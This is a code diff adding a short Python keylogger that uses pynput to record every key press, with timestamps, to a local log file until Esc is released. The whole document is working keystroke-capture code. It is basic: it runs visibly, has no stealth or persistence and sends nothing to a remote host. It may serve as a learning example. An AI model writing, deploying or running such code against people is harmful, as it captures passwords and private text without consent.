@@ -1,0 +1,38 @@
+import logging
+from pynput import keyboard
+
+# Set up logging configuration to write to 'logfile.txt'
+# %(asctime)s adds a timestamp to each log entry
+# %(message)s is the actual log message (key pressed)
+logging.basicConfig(
+    filename="logfile.txt",
+    level=logging.DEBUG,
+    format='%(asctime)s: %(message)s'
+)
+
+def on_press(key):
+    """
+    This function is called whenever a key is pressed.
+    It logs the key to the specified log file.
+    """
+    try:
+        # Convert the key to a string and log it
+        logging.info(f'Key pressed: {key}')
+    except Exception as e:
+        # Print any error that occurs during logging
+        print(f"Error: {e}")
+
+def on_release(key):
+    """
+    This function is called whenever a key is released.
+    It stops the keylogger when the 'Esc' key is released.
+    """
+    if key == keyboard.Key.esc:
+        # Stop the listener
+        print("Esc key pressed. Exiting...")
+        return False
+
+# Create an instance of Listener and set the on_press and on_release functions
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    # Join the listener thread to the main thread to keep the program running
+    listener.join()
